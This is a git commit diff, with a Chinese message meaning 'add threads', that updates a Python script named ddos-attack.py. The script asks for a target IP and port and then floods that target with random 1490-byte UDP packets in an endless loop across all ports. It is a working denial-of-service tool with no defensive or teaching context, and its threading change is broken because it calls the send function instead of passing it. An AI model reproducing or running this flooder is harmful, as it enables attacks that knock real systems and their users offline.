fe645e26f450cb1cabe9669212387f82348c3c14
xsy2004 <1242251966@qq.com>
2021-10-24 20:15:35 +0800

    添加线程

--- ddos-attack.py
+++ ddos-attack.py
@@ -1,10 +1,12 @@
 import sys
 import os
+import threading
 import time
 import socket
 import random
-#Code Time
+# Code Time
 from datetime import datetime
+
 now = datetime.now()
 hour = now.hour
 minute = now.minute
@@ -14,21 +16,31 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = os.urandom(1490)
 #############
+print("DDOS-attack")
+ip = input("IP Target:")
+port = int(input("Port:"))
 
-print "DDOS-attack"
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+print("ddos-attack start after 3 second")
 
-print "ddos-attack start after 3 second"
 time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     #print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
 
+
+def run_send(ip, port):
+    sent = 0
+    while True:
+        sock.sendto(bytes, (ip, port))
+        sent = sent + 1
+        port = port + 1
+        # print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+        if port == 65534:
+            port = 1
+
+
+t1 = threading.Thread(target=run_send(ip, port), name='send')
+t2 = threading.Thread(target=run_send(ip, port), name='send2')
+t1.start()
+t2.start()
+t1.join()
+t2.join()
